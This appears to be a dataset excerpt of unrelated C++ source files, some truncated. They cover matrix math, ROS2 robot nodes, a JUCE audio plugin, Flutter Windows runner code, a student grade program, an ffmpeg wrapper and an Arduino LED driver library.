1.0f;\r\n}\r\n\r\n//-----------------------------------------------------------------------------\r\n// Vector3DMultiplyPosition treats src2 as if it's a point (adds the translation)\r\n//-----------------------------------------------------------------------------\r\n// NJS: src2 is passed in as a full vector rather than a reference to prevent the need\r\n// for 2 branches and a potential copy in the body.  (ie, handling the case when the src2\r\n// reference is the same as the dst reference ).\r\ninline void Vector3DMultiplyPosition(const VMatrix& src1, const Vector& src2, Vector& dst)\r\n{\r\n\tdst[0] = src1[0][0] * src2.x + src1[0][1] * src2.y + src1[0][2] * src2.z + src1[0][3];\r\n\tdst[1] = src1[1][0] * src2.x + src1[1][1] * src2.y + src1[1][2] * src2.z + src1[1][3];\r\n\tdst[2] = src1[2][0] * src2.x + src1[2][1] * src2.y + src1[2][2] * src2.z + src1[2][3];\r\n}\r\n\r\n//-----------------------------------------------------------------------------\r\n// Methods related to the basis vectors of the matrix\r\n//-----------------------------------------------------------------------------\r\n\r\ninline Vector VMatrix::GetForward() const\r\n{\r\n\treturn Vector(m[0][0], m[1][0], m[2][0]);\r\n}\r\n\r\ninline Vector VMatrix::GetLeft() const\r\n{\r\n\treturn Vector(m[0][1], m[1][1], m[2][1]);\r\n}\r\n\r\ninline Vector VMatrix::GetUp() const\r\n{\r\n\treturn Vector(m[0][2], m[1][2], m[2][2]);\r\n}\r\n\r\ninline void VMatrix::SetForward(const Vector& vForward)\r\n{\r\n\tm[0][0] = vForward.x;\r\n\tm[1][0] = vForward.y;\r\n\tm[2][0] = vForward.z;\r\n}\r\n\r\ninline void VMatrix::SetLeft(const Vector& vLeft)\r\n{\r\n\tm[0][1] = vLeft.x;\r\n\tm[1][1] = vLeft.y;\r\n\tm[2][1] = vLeft.z;\r\n}\r\n\r\ninline void VMatrix::SetUp(const Vector& vUp)\r\n{\r\n\tm[0][2] = vUp.x;\r\n\tm[1][2] = vUp.y;\r\n\tm[2][2] = vUp.z;\r\n}\r\n\r\ninline void VMatrix::GetBasisVectors(Vector& vForward, Vector& vLeft, Vector& vUp) const\r\n{\r\n\tvForward.Init(m[0][0], m[1][0], m[2][0]);\r\n\tvLeft.Init(m[0][1], m[1][1], m[2][1]);\r\n\tvUp.Init(m[0][2], m[1][2], m[2][2]);\r\n}\r\n\r\ninline void VMatrix::SetBasisVectors(const Vector& vForward, const Vector& vLeft, const Vector& vUp)\r\n{\r\n\tSetForward(vForward);\r\n\tSetLeft(vLeft);\r\n\tSetUp(vUp);\r\n}\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Methods related to the translation component of the matrix\r\n//-----------------------------------------------------------------------------\r\n\r\ninline Vector VMatrix::GetTranslation() const\r\n{\r\n\treturn Vector(m[0][3], m[1][3], m[2][3]);\r\n}\r\n\r\ninline Vector& VMatrix::GetTranslation(Vector& vTrans) const\r\n{\r\n\tvTrans.x = m[0][3];\r\n\tvTrans.y = m[1][3];\r\n\tvTrans.z = m[2][3];\r\n\treturn vTrans;\r\n}\r\n\r\ninline void VMatrix::SetTranslation(const Vector& vTrans)\r\n{\r\n\tm[0][3] = vTrans.x;\r\n\tm[1][3] = vTrans.y;\r\n\tm[2][3] = vTrans.z;\r\n}\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// appply translation to this matrix in the input space\r\n//-----------------------------------------------------------------------------\r\ninline void VMatrix::PreTranslate(con",
    "#include <functional>\n#include <memory>\n#include <thread>\n#include <vector>\n#include <fstream>\n#include <iostream>\n#include <chrono>\n#include <string>     // std::string, std::stof\n\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/bool.hpp\"\n#include \"nao_lola_sensor_msgs/msg/joint_indexes.hpp\"\n#include \"nao_lola_sensor_msgs/msg/joint_positions.hpp\"\n#include \"nao_lola_command_msgs/msg/joint_positions.hpp\"\n#include \"nao_lola_command_msgs/msg/joint_indexes.hpp\"\n#include \"nao_lola_command_msgs/msg/joint_stiffnesses.hpp\"\n\nusing std::placeholders::_1;\nusing namespace std::chrono_literals;\n\nclass JointsRecorder : public rclcpp::Node {\n\n public:\n\n  JointsRecorder()\n    : Node(\"puppeteer\") {\n    jpos_sub_ = this->create_subscription<nao_lola_sensor_msgs::msg::JointPositions>(\n                  \"sensors/joint_positions\", 10, std::bind(&JointsRecorder::jpos_callback, this, _1));\n    record_cmd_sub_ = this->create_subscription<std_msgs::msg::Bool>(\n                        \"record_cmd_topic\", 10, std::bind(&JointsRecorder::record_cmd_callback, this, _1));\n    play_cmd_sub_ = this->create_subscription<std_msgs::msg::Bool>(\n                      \"play_cmd_topic\", 10, std::bind(&JointsRecorder::play_cmd_callback, this, _1));\n\n    jpos_pub_ = this->create_publisher<nao_lola_command_msgs::msg::JointPositions>(\n                  \"effectors/joint_positions\", 10);\n    jstiff_pub_ = this->create_publisher<nao_lola_command_msgs::msg::JointStiffnesses>(\n                    \"effectors/joint_stiffnesses\", 10);\n\n    //jstiff_cmd_.indexes.push_back(nao_lola_sensor_msgs::msg::JointIndexes::LHIPYAWPITCH);\n    //jstiff_cmd_.stiffnesses.push_back(1.0);\n    //jstiff_pub_->publish(jstiff_cmd_);\n\n    RCLCPP_INFO_STREAM(this->get_logger(), \"JointsRecorder node initialized\");\n  }\n\n private:\n\n  /*enum movingJoints : unsigned int {\n    LSHOULDERPITCH = nao_lola_sensor_msgs::msg::JointIndexes::LSHOULDERPITCH;\n    LSHOULDERROLL = nao_lola_sensor_msgs::msg::JointIndexes::LSHOULDERROLL;\n    LELBOWYAW = nao_lola_sensor_msgs::msg::JointIndexes::LELBOWYAW;\n    LELBOWROLL = nao_lola_sensor_msgs::msg::JointIndexes::LELBOWROLL;\n    LWRISTYAW = nao_lola_sensor_msgs::msg::JointIndexes::LWRISTYAW;\n    RSHOULDERPITCH = nao_lola_sensor_msgs::msg::JointIndexes::RSHOULDERPITCH;\n    RSHOULDERROLL = nao_lola_sensor_msgs::msg::JointIndexes::RSHOULDERROLL;\n    RELBOWYAW = nao_lola_sensor_msgs::msg::JointIndexes::RELBOWYAW;\n    RELBOWROLL = nao_lola_sensor_msgs::msg::JointIndexes::RELBOWROLL;\n    RWRISTYAW = nao_lola_sensor_msgs::msg::JointIndexes::RWRISTYAW;\n  }*/\n\n  rclcpp::Subscription<std_msgs::msg::Bool>::SharedPtr record_cmd_sub_;\n  rclcpp::Subscription<std_msgs::msg::Bool>::SharedPtr play_cmd_sub_;\n  rclcpp::Subscription<nao_lola_sensor_msgs::msg::JointPositions>::SharedPtr jpos_sub_;\n\n  rclcpp::Publisher<nao_lola_command_msgs::msg::JointPositions>::SharedPtr jpos_pub_;\n  rclcpp::Publisher<nao_lola_command_msgs::msg::JointStiffnesses>::SharedPtr jstiff_pub_;\n\n  bool recording_ = false;\n  nao_lola_sensor_msgs::msg::JointIndexes joint_indexes_msg_;\n  uint8_t rec_joint_indexes_ [10] =  {  joint_indexes_msg_.LSHOULDERPITCH,\n                                        joint_indexes_msg_.LSHOULDERROLL,\n                                        joint_indexes_msg_.LELBOWYAW,\n                                        joint_indexes_msg_.LELBOWROLL,\n                                        joint_indexes_msg_.LWRISTYAW,\n                                        joint_indexes_msg_.RSHOULDERPITCH,\n                                        joint_indexes_msg_.RSHOULDERROLL,\n                                        joint_indexes_msg_.RELBOWYAW,\n                                        joint_indexes_msg_.RELBOWROLL,\n                                        joint_indexes_msg_.RWRISTYAW\n                                     };\n\n  uint8_t num_rec_joints_ = sizeof(rec_joint_indexes_) / sizeof(rec_joint_indexes_[0]);\n  std::vector<float> record_;\n  std::fstream file_;\n  nao_lola_command_msgs::msg::JointPositions jpos_cmd_;\n  nao_lola_command_msgs::msg::JointStiffnesses jstiff_cmd_;\n\n\n\n  void jpos_callback(const nao_lola_sensor_msgs::msg::JointPositions & joints) {\n\n    if (recording_) {\n\n      for (auto i : rec_joint_indexes_) {\n        record_.emplace_back(joints.positions[i]);\n      }\n      RCLCPP_DEBUG_STREAM(this->get_logger(), \"New joint positions saved\");\n\n    }\n\n  }\n\n  void record_cmd_callback(const std_msgs::msg::Bool & msg)  {\n    RCLCPP_INFO_STREAM(this->get_logger(), \"I heard: '\" << msg.data << \"' from record_cmd_sub\");\n    bool cmd = msg.data;\n\n    if (!recording_ && cmd) {\n\n      for (int i : rec_joint_indexes_) {\n        jstiff_cmd_.indexes.push_back(i);\n        jstiff_cmd_.stiffnesses.push_back(0.0);\n      }\n      jstiff_pub_->publish(jstiff_cmd_);\n      RCLCPP_DEBUG_STREAM(this->get_logger(), \"Publishing 0.0 on effectors/joint_stiffnesses\");\n      jstiff_cmd_.indexes.clear();\n      jstiff_cmd_.stiffnesses.clear();\n\n      rclcpp::sleep_for(1s);\n\n      recording_ = true;\n      RCLC",
    "//Made by :Abubakar Aamir .\r\n//Write a C++ program that takes input regarding a student's personal details and marks obtained in various subjects, calculates the percentage, assigns a grade, and provides remarks based on the obtained percentage.\"\r\n \r\n                      //PSEUDOCODE OF THIS PROGRAM:\r\n\r\n\r\n// 1. Start\r\n\r\n// 2. Input student details: Name, Fathername, rollno, semester\r\n\r\n// 3. Input marks for subjects: calculus, pst, Pf, english, Ds\r\n\r\n// 4. Calculate total obtained marks: obtained = calculus + pst + Pf + english + Ds\r\n\r\n// 5. Calculate percentage: percentage = (obtained / 500) * 100\r\n\r\n// 6. Output student details and marks\r\n\r\n// 7. Determine grade based on percentage:\r\n//    - If percentage >= 80, output \"Grade A-1\"\r\n//    - Else if percentage >= 70, output \"Grade A\"\r\n//    - Else if percentage >= 60, output \"Grade B\"\r\n//    - Else if percentage >= 50, output \"Grade C\"\r\n//    - Else if percentage >= 40, output \"Grade D\"\r\n//    - Else if percentage >= 33, output \"Grade E\"\r\n//    - Else, output \"Grade F== fail\"\r\n\r\n// 8. Determine remarks based on percentage:\r\n//    - If percentage >= 80, output \"Remarks: Excellent\"\r\n//    - Else if percentage >= 70, output \"Remarks: Very good\"\r\n//    - Else if percentage >= 60, output \"Remarks: Good\"\r\n//    - Else if percentage >= 50, output \"Remarks: Fair\"\r\n//    - Else if percentage >= 40, output \"Remarks: Poor\"\r\n//    - Else if percentage >= 33, output \"Remarks: You need a lot of improvement\"\r\n//    - Else, output \"Remarks: Bring your parents tomorrow\"\r\n\r\n// 9. End\r\n\r\n\r\n#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n\r\n    int main() {\r\n    string Name, Fathername;// String data type  character ke liye use karte ha aur humne bhi kiya ha \r\n    int rollno, semester;//// Taking rollnumber and semester in integar data type because number type ka data type ha hamara\r\n    int calculus, pst, Pf, english, Ds, obtained, percentage;// taking more integars for subjects marks\r\n\r\n    cout << \"Enter your name: \";//Cout<< is used to print the message like printf();\r\n    cin >> Name;// cin>> is used t0 taking input from the user like scanf();\r\n\r\n    cout << \"Enter your father's name: \";\r\n    cin >> Fathername;\r\n\r\n    cout << \"Enter your roll number: \";\r\n    cin >> rollno;\r\n\r\n    cout << \"Enter your semester: \";\r\n    cin >> semester;\r\n\r\n    cout << \"Enter your marks for each subject:\" << endl;\r\n    \r\n    cout << \"Calculus: \";\r\n    cin >> calculus;\r\n    \r\n    cout << \"English: \";\r\n    cin >> english;\r\n    \r\n    cout << \"PST: \";\r\n    cin >> pst;\r\n    \r\n    cout << \"Discrete structure: \";\r\n    cin >> Ds;\r\n    \r\n    cout << \"Programming Fundamentals: \";\r\n    cin >> Pf;\r\n\r\n//upper humne aik obtained ka variable banaya tha ab usmei sare subjects ke marks ko plus karwa diya ha humne\r\n    obtained = english + Pf + Ds + pst + calculus;\r\n    percentage = obtained * 100 / 500;\r\n\r\n    cout << \"-----------Marksheets-------------------\" << endl;\r\n    cout << \"Your Name is \" << Name << endl;\r\n    cout << \"Your Father's Name is \" << Fathername << endl;\r\n    cout << \"Your Class is \" << semester << endl;\r\n    cout << \"Your Roll no is \" << rollno << endl;\r\n    cout << \"Your obtained marks is \" << obtained << endl;\r\n    cout << \"Your percentage is \" << percentage << endl;\r\n\r\n//using if and else if condition to find:agar number 80 ha toh your grade is A-1 :and so on\r\n    if (percentage >= 80)\r\n        cout << \"Grade A-1\" << endl;\r\n    else if (percentage >= 70)\r\n        cout << \"Grade A\" << endl;\r\n    else if (percentage >= 60)\r\n        cout << \"Grade B\" << endl;\r\n    else if (percentage >= 50)\r\n        cout << \"Grade C\" << endl;\r\n    else if (percentage >= 40)\r\n        cout << \"Grade D\" << endl;\r\n    else if (percentage >= 33)\r\n        cout << \"Grade E\" << endl;\r\n    else\r\n        cout << \"Grade F== fail\" << endl;\r\n\r\n//here we give the remarks (agar 80 se zada ha toh exellent and so on)\r\n    if (percentage >= 80)\r\n        cout << \"Remarks: Excellent\" << endl;\r\n    else if (percentage >= 70)\r\n        cout << \"Remarks: Very good\" << endl;\r\n    else if (percentage >= 60)\r\n        cout << \"Remarks: Good\" << endl;\r\n    else if (percentage >= 50)\r\n        cout << \"Remarks: Fair\" << endl;\r\n    else if (percentage >= 40)\r\n        cout << \"Remarks: Poor\" << endl;\r\n    else if (percentage >= 33)\r\n        cout << \"Remarks: You need a lot of improvement\" << endl;\r\n    else\r\n        cout << \"Remarks: Bring your parents tomorrow\" << endl;\r\n\r\n\r\n    return 0;\r\n}",
    "#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\n//==============================================================================\r\nAudioPluginAudioProcessor::AudioPluginAudioProcessor()\r\n     : AudioProcessor (BusesProperties()\r\n                     #if ! JucePlugin_IsMidiEffect\r\n                      #if ! JucePlugin_IsSynth\r\n                       .withInput  (\"Input\",  juce::AudioChannelSet::stereo(), true)\r\n                      #endif\r\n                       .withOutput (\"Output\", juce::AudioChannelSet::stereo(), true)\r\n                     #endif\r\n                       ), paramList (*this, nullptr, \"params\", createParams())\r\n{\r\n}\r\n\r\nAudioPluginAudioProcessor::~AudioPluginAudioProcessor()\r\n{\r\n}\r\n\r\n//==============================================================================\r\nconst juce::String AudioPluginAudioProcessor::getName() const\r\n{\r\n    return JucePlugin_Name;\r\n}\r\n\r\nbool AudioPluginAudioProcessor::acceptsMidi() const\r\n{\r\n   #if JucePlugin_WantsMidiInput\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\nbool AudioPluginAudioProcessor::producesMidi() const\r\n{\r\n   #if JucePlugin_ProducesMidiOutput\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\nbool AudioPluginAudioProcessor::isMidiEffect() const\r\n{\r\n   #if JucePlugin_IsMidiEffect\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\ndouble AudioPluginAudioProcessor::getTailLengthSeconds() const\r\n{\r\n    return 0.0;\r\n}\r\n\r\nint AudioPluginAudioProcessor::getNumPrograms()\r\n{\r\n    return 1;   // NB: some hosts don't cope very well if you tell them there are 0 programs,\r\n                // so this should be at least 1, even if you're not really implementing programs.\r\n}\r\n\r\nint AudioPluginAudioProcessor::getCurrentProgram()\r\n{\r\n    return 0;\r\n}\r\n\r\nvoid AudioPluginAudioProcessor::setCurrentProgram (int index)\r\n{\r\n    juce::ignoreUnused (index);\r\n}\r\n\r\nconst juce::String AudioPluginAudioProcessor::getProgramName (int index)\r\n{\r\n    juce::ignoreUnused (index);\r\n    return {};\r\n}\r\n\r\nvoid AudioPluginAudioProcessor::changeProgramName (int index, const juce::String& newName)\r\n{\r\n    juce::ignoreUnused (index, newName);\r\n}\r\n\r\n//==============================================================================\r\nvoid AudioPluginAudioProcessor::prepareToPlay (double sampleRate, int samplesPerBlock)\r\n{\r\n    // Use this method as the place to do any pre-playback\r\n    // initialisation that you need..\r\n    juce::ignoreUnused (sampleRate, samplesPerBlock);\r\n}\r\n\r\nvoid AudioPluginAudioProcessor::releaseResources()\r\n{\r\n    // When playback stops, you can use this as an opportunity to free up any\r\n    // spare memory, etc.\r\n}\r\n\r\nbool AudioPluginAudioProcessor::isBusesLayoutSupported (const BusesLayout& layouts) const\r\n{\r\n  #if JucePlugin_IsMidiEffect\r\n    juce::ignoreUnused (layouts);\r\n    return true;\r\n  #else\r\n    // This is the place where you check if the layout is supported.\r\n    // In this template code we only support mono or stereo.\r\n    // Some plugin hosts, such as certain GarageBand versions, will only\r\n    // load plugins that support stereo bus layouts.\r\n    if (layouts.getMainOutputChannelSet() != juce::AudioChannelSet::mono()\r\n     && layouts.getMainOutputChannelSet() != juce::AudioChannelSet::stereo())\r\n        return false;\r\n\r\n    // This checks if the input layout matches the output layout\r\n   #if ! JucePlugin_IsSynth\r\n    if (layouts.getMainOutputChannelSet() != layouts.getMainInputChannelSet())\r\n        return false;\r\n   #endif\r\n\r\n    return true;\r\n  #endif\r\n}\r\n\r\nvoid AudioPluginAudioProcessor::processBlock (juce::AudioBuffer<float>& buffer,\r\n                                              juce::MidiBuffer& midiMessages)\r\n{\r\n    juce::ignoreUnused (midiMessages);\r\n\r\n    juce::ScopedNoDenormals noDenormals;\r\n    auto totalNumInputChannels  = getTotalNumInputChannels();\r\n    auto totalNumOutputChannels = getTotalNumOutputChannels();\r\n\r\n    for (auto i = totalNumInputChannels; i < totalNumOutputChannels; ++i)\r\n        buffer.clear (i, 0, buffer.getNumSamples());\r\n\r\n    auto gain = paramList.getRawParameterValue (\"GAIN\")->load();\r\n\r\n    for (int channel = 0; channel < totalNumInputChannels; ++channel)\r\n    {\r\n        auto* channelData = buffer.getWritePointer (channel);\r\n\r\n        for (int sample = 0; sample < buffer.getNumSamples(); ++sample)\r\n        {\r\n            channelData[sample] *= juce::Decibels::decibelsToGain (gain);\r\n        }\r\n    }\r\n}\r\n\r\n//==============================================================================\r\nbool AudioPluginAudioProcessor::hasEditor() const\r\n{\r\n    return true; // (change this to false if you choose to not supply an editor)\r\n}\r\n\r\njuce::AudioProcessorEditor* AudioPluginAudioProcessor::createEditor()\r\n{\r\n    return new AudioPluginAudioProcessorEditor (*this);\r\n}\r\n\r\n//==============================================================================\r\nvoid AudioPluginAudioProcessor::getStateInformation (juce::MemoryBlock& destData)\r\n{\r\n    // You should use this method to store y",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Requeriments: Had ffmpeg already installed.\r\n//Made by boowithbuds\r\n#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n\r\nint main() {\r\n    std::string input_file, output_file;\r\n\r\n    std::cout << \"Enter the path of the input MP4 file: \";\r\n    std::getline(std::cin, input_file);\r\n\r\n    // Generate output file name in the same directory as input file\r\n    size_t last_slash = input_file.find_last_of(\"/\\\\\");\r\n    std::string path = input_file.substr(0, last_slash + 1);\r\n    std::string input_filename = input_file.substr(last_slash + 1);\r\n    size_t extension_pos = input_filename.find_last_of(\".\");\r\n    output_file = path + input_filename.substr(0, extension_pos) + \".mp3\";\r\n\r\n    std::string command = \"ffmpeg -i \\\"\" + input_file + \"\\\" -vn -acodec libmp3lame -ab 128k \\\"\" + output_file + \"\\\"\";\r\n\r\n    int result = system(command.c_str());\r\n\r\n    if (result == 0) {\r\n        std::cout << \"Successful conversion. The MP3 file has been saved as: \" << output_file << std::endl;\r\n    } else {\r\n        std::cerr << \"Error during conversion.\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    system(\"pause\");\r\n    return 0;\r\n}",
    "/* Arduino MAX7219/7221 Library\n * See the README file for author and licensing information. In case it's\n * missing from your distribution, use the one here as the authoritative\n * version: https://github.com/dariomas/DigitLed72xx/blob/master/README.md\n *\n * This library is for use with Maxim's MAX7219 and MAX7221 LED driver chips.\n * Austria Micro Systems' AS1100/1106/1107 is a pin-for-pin compatible and is\n * also supported.\n *  Thankyoy to Leonardo SAMMARTANO for help and support.\n *\n * See the example sketches to learn how to use the library in your code.\n *\n * This is the main code file for the library.\n * See the header file for better function documentation.\n *\n * ---------------------------------------------------------------------------\n * Copyright (c) 2020 Dariomas\n *\n * MIT license, all text here must be included in any redistribution.\n */\n\n// Version 0.0.7\n\n#include \"DigitLed72xx.h\"\n/**\n * @brief This class provied a control interface for MAX7219 and MAX7221 7-seg Led display drivers.\n * @details This Controller Class is mainly target at 7-Segment Led Displays.\n * @warning This object is not thread safe.\n * @note This library implements the 7-segment numeric LED display of 8 digits\n *\n * @todo ...\n *\n * The MAX7219/MAX7221 are compact, serial input/output common-cathode display drivers that interface\n * microprocessors (\u00b5Ps) to 7-segment numeric LED displays of up to 8 digits.\n * Datasheet: https://datasheets.maximintegrated.com/en/ds/MAX7219-MAX7221.pdf\n *\n * Library Description\n *\n *  - The host communicates with the MAX72xx using hardware SPI\n */\n\n/*!\n * @brief Construct a new DigitLed72xx controller for use with hardware SPI\n *\n * @param  csPin    CS/LOAD pin for selecting the device\n * @param  nDevice  number of devices that can be controlled\n * @param  spiClass instance of SPI class\n *\n */\nDigitLed72xx::DigitLed72xx(unsigned char csPin, unsigned char nDevice, SPIClass &spiClass) : spi(&spiClass), pinLOAD_CS(csPin), maxDevices(nDevice)\n{\n  _digitLimit = new byte[maxDevices];\n  for (byte i = 0; i < maxDevices; ++i)\n  {\n    _digitLimit[i] = 8;\n  }\n  begin();\n}\n\n/*!\n *    @brief  Initializes SPI bus and sets CS pin high\n *\n */\ninline void DigitLed72xx::begin(void)\n{\n  // Set load pin to output\n  //pinLOAD_CS = csPin;\n  pinMode(pinLOAD_CS, OUTPUT);\n  digitalWrite(pinLOAD_CS, HIGH);\n\n  // Start SPI\n  spi->begin();\n#if defined(SPI_HAS_TRANSACTION)\n  spi->beginTransaction(SPISettings(SPIMAXSPEED, MSBFIRST, SPI_MODE0));\n#else\n  spi->setClockDivider(SPI_CLOCK_DIV16); // 1 MHz clock\n  spi->setBitOrder(MSBFIRST);\n  spi->setDataMode(SPI_MODE0);\n#endif // SPI_HAS_TRANSACTION\n\n  spiWrite(DISPLAYTEST_ADDR, OP_OFF);\n  //we go into shutdown-mode on startup\n  spiWrite(SHUTDOWN_ADDR, OP_OFF);\n  //scanlimit is set to max on startup\n  spiWrite(SCANLIMIT_ADDR, 7); // show 8 digits\n  //decode is done in raw mode\n  spiWrite(DECODEMODE_ADDR, 0);\n  //clearSegments\n  for (unsigned char i = 1; i < 9; ++i)\n    spiWrite(i, MAX72b);        // blank\n  spiWrite(BRIGHTNESS_ADDR, 0); // min power\n                                //  spiWrite(SHUTDOWN_ADDR, OP_ON);\n  if (maxDevices > 1)\n    shiftAll(); // shiftout no_op\n\n#if defined(SPI_HAS_TRANSACTION)\n  spi->endTransaction();\n#endif // SPI_HAS_TRANSACTION\n}\n\nvoid DigitLed72xx::end(void)\n{\n  if (_digitLimit)\n    delete[] _digitLimit;\n  //sendToAll shutdown mode (ie. turn it off)\n  write(SHUTDOWN_ADDR, OP_OFF, maxDevices);\n  spi->end();\n}\n\nvoid DigitLed72xx::shiftAll(unsigned char nDevice)\n{\n  // shiftout no_op\n  for (unsigned char i = nDevice; i < maxDevices; ++i) // (maxDevices - nDevice)\n    spiWrite(NOOP_ADDR, OP_OFF);\n}\n\nvoid DigitLed72xx::setBright(unsigned char brightness, unsigned char nDevice)\n{\n  if (brightness > 15)\n    return;\n  write(BRIGHTNESS_ADDR, brightness, nDevice);\n}\n\n/*!\n         * @brief Set the number of digits to be displayed.\n         * See datasheet for side effects of the scanlimit on the brightness\n         * of the display.\n         * @param limit  number of digits to be displayed (1..8)\n         * @param nDevice address of the display to control\n         */\nvoid DigitLed72xx::setDigitLimit(unsigned char limit, unsigned char nDevice)\n{\n  if ((limit == 0) || (limit > 8))\n    return;\n  for (unsigned char i = 0; i < maxDevices; ++i)\n    if ((nDevice >= maxDevices) || (i == nDevice))\n    {\n      _digitLimit[i] = limit;\n      spiTransfer(SCANLIMIT_ADDR, limit - 1, i);\n    }\n}\n\nvoid DigitLed72xx::clear(unsigned char nDevice)\n{\n  for (unsigned char j = 0; j < maxDevices; ++j)\n    if ((nDevice >= maxDevices) || (j == nDevice))\n      //clearSegments\n      for (unsigned char i = 1; i <= _digitLimit[j]; ++i)\n        spiTransfer(i, MAX72b, j);\n}\n\nvoid DigitLed72xx::on(unsigned char nDevice)\n{\n  write(SHUTDOWN_ADDR, OP_ON, nDevice);\n}\n\nvoid DigitLed72xx::off(unsigned char nDevice)\n{\n  write(SHUTDOWN_ADDR, OP_OFF, nDevice);\n}\n\nvoid DigitLed72xx::setDigit(unsigned char digit, byte value, byte dp, unsigned char nDevice)\n{\n  if (digit > 8)\n    return;\n  if (dp > ",
    "// Filename: stereo_image_splitter.cpp\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"sensor_msgs/msg/image.hpp\"\n#include <memory>\n#include <opencv2/opencv.hpp>\n#include <cv_bridge/cv_bridge.h>\n\nclass StereoImageSplitter : public rclcpp::Node\n{\npublic:\n  // Update the constructor to accept NodeOptions\n  explicit StereoImageSplitter(const rclcpp::NodeOptions & options = rclcpp::NodeOptions())\n  : Node(\"stereo_image_splitter\", options)\n  {\n    this->declare_parameter<bool>(\"is_grey\", false);\n    this->get_parameter(\"is_grey\", is_grey_);\n\n    // Your subscription and publisher setup remains the same\n    subscription_ = this->create_subscription<sensor_msgs::msg::Image>(\n      \"stitched_images\", 10,\n      std::bind(&StereoImageSplitter::split_and_publish, this, std::placeholders::_1));\n\n    left_publisher_ = this->create_publisher<sensor_msgs::msg::Image>(\"left_image\", 10);\n    right_publisher_ = this->create_publisher<sensor_msgs::msg::Image>(\"right_image\", 10);\n  }\n\nprivate:\n  void split_and_publish(const sensor_msgs::msg::Image::SharedPtr msg) {\n        cv_bridge::CvImagePtr cv_ptr;\n        try {\n            // Direct conversion to cv::Mat with cv_bridge handling common encodings\n            cv_ptr = cv_bridge::toCvCopy(msg);\n        } catch (cv_bridge::Exception& e) {\n            RCLCPP_ERROR(this->get_logger(), \"cv_bridge exception: %s\", e.what());\n            return;\n        }\n\n        // Check source encoding and convert if necessary\n        cv::Mat processed_image;\n        if (msg->encoding == \"yuv422_yuy2\") {\n            // Convert YUV422 (YUY2) to BGR for processing\n            cv::cvtColor(cv_ptr->image, processed_image, cv::COLOR_YUV2BGR_YUY2);\n        } else if (msg->encoding == \"rgb8\") {\n            // Assume the source is BGR if not grayscale and not YUY2. Adjust if your camera uses RGB.\n            // processed_image = 